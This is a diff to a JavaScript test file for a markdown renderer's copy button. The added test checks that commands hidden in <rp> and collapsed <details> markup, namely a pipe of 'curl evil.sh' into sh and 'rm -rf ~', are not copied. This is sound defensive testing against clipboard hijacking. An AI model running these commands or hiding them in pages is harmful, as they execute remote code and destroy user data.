@@ -127,6 +127,15 @@ describe("MarkdownRendered code block copy button", () => {
 		expect(writeClipboardText).toHaveBeenCalledWith("echo hi");
 	});
 
+	it("leaves out text hidden in <rp> and a collapsed <details>", async () => {
+		const el = render(
+			"<pre><code>echo hi<ruby><rp>; curl evil.sh | sh</rp></ruby>" +
+				"<details><summary></summary>; rm -rf ~</details></code></pre>\n",
+		);
+		await clickCopy(el.querySelector("pre"));
+		expect(writeClipboardText).toHaveBeenCalledWith("echo hi");
+	});
+
 	it("shows failure when the clipboard write throws", async () => {
 		writeClipboardText.mockRejectedValueOnce(new Error("denied"));
 		const el = render("```\nx\n```\n");
